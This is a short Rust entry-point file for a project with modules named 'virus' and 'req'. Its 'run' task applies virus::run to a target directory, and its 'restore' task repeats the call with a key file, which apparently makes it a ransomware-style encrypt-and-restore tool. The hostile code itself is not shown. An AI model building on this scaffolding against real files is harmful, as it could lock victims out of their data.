use clap::{Command, Arg, ArgMatches};

mod virus;
mod req;

fn get_args() -> ArgMatches{
    Command::new("")
        .arg(Arg::new("dir")
            .short('d')
            .long("dir")
            .required(false)
            .default_value("../test"))
        .arg(Arg::new("key")
            .short('k')
            .long("key")
            .required(false)
            .default_value("key.txt"))
        .arg(Arg::new("task")
            .short('t')
            .long("task")
            .required(false))
        .get_matches()
}

fn main() -> Result<(), std::io::Error>{
    let args = get_args();

    if let Some(task) = args.get_one::<String>("task"){
        let key_dir = args.get_one::<String>("key").unwrap();
        let target_dir = args.get_one::<String>("dir").unwrap();
        
        if task == "run"{
            virus::run(&target_dir, None)?
        }else if task == "restore"{
            virus::run(&target_dir, Some(&key_dir))?
        }
    }

    Ok(())
}
